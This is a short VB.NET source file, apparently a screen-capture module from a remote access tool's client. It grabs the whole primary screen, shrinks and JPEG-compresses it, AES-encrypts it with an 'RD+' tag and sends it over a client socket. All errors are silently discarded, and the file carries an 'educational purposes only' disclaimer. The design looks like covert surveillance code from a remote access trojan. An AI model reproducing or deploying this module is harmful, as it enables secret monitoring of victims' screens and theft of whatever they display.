Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Imports System.Windows.Forms

'       │ Author     : NYAN CAT
'       │ Name       : Simple remote desktop. "capture,resize,compress,send"

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program Is distributed for educational purposes only.

Public Class RemoteDesktop

    Public Shared Sub Capture(ByVal W As Integer, ByVal H As Integer)
        Try
            Dim B As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
            Dim g As Graphics = Graphics.FromImage(B)
            g.CompositingQuality = CompositingQuality.HighSpeed
            g.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)

            Dim Resize As New Bitmap(W, H)
            Dim g2 As Graphics = Graphics.FromImage(Resize)
            g2.CompositingQuality = CompositingQuality.HighSpeed
            g2.DrawImage(B, New Rectangle(0, 0, W, H), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)

            Dim encoderParameter As EncoderParameter = New EncoderParameter(Encoder.Quality, 50) '50 or 50+
            Dim encoderInfo As ImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg)
            Dim encoderParameters As EncoderParameters = New EncoderParameters(1)
            encoderParameters.Param(0) = encoderParameter

            Dim MS As New IO.MemoryStream
            Resize.Save(MS, encoderInfo, encoderParameters)

            Try
                SyncLock ClientSocket.S
                    Using MEM As New IO.MemoryStream
                        Dim Bb As Byte() = AES_Encryptor(SB(("RD+" + ClientSocket.SPL + BS(MS.ToArray))))
                        Dim L As Byte() = SB(Bb.Length & CChar(vbNullChar))

                        MEM.Write(L, 0, L.Length)
                        MEM.Write(Bb, 0, Bb.Length)

                        ClientSocket.S.Poll(-1, Net.Sockets.SelectMode.SelectWrite)
                        ClientSocket.S.Send(MEM.ToArray, 0, MEM.Length, Net.Sockets.SocketFlags.None)
                    End Using
                End SyncLock
            Catch ex As Exception
                ClientSocket.isConnected = False
            End Try

            Try
                g.Dispose()
                G2.Dispose()
                B.Dispose()
                MS.Dispose()
            Catch ex As Exception
            End Try

        Catch ex As Exception
        End Try

    End Sub

    Private Shared Function GetEncoderInfo(ByVal format As ImageFormat) As ImageCodecInfo
        Try
            Dim j As Integer
            Dim encoders() As ImageCodecInfo
            encoders = ImageCodecInfo.GetImageEncoders()

            j = 0
            While j < encoders.Length
                If encoders(j).FormatID = format.Guid Then
                    Return encoders(j)
                End If
                j += 1
            End While
            Return Nothing
        Catch ex As Exception
        End Try
    End Function
End Class
